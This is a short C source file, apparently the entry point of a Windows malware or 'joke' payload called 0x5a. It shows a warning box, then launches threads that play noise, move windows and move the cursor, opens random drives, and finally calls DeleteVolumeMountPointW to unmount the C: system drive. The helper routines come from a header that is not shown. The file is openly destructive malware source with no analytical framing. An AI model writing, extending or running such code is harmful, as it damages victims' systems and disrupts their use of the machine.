#include "0x5a.h"

INT WINAPI wWinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	PWSTR pszCmdLine,
	INT nShowCmd
)
{
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(pszCmdLine);
	UNREFERENCED_PARAMETER(nShowCmd);

	MessageBoxW(NULL, L"LOUD NOISE WARNING", L"0x5a", MB_OK | MB_ICONWARNING);
	Sleep(3000);

	HANDLE hBeepThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)AnnoyingSound, NULL, 0, NULL);
	HANDLE hMoveWindowThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MoveWindowThread, NULL, 0, NULL);
	Sleep(2000);

	HANDLE hCursorThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)CursorMoveThread, NULL, 0, NULL);
	Sleep(1000);
	OpenRandomDrives();

	Sleep(10000);
	DeleteVolumeMountPointW(L"C:\\");
	Sleep(INFINITE);
}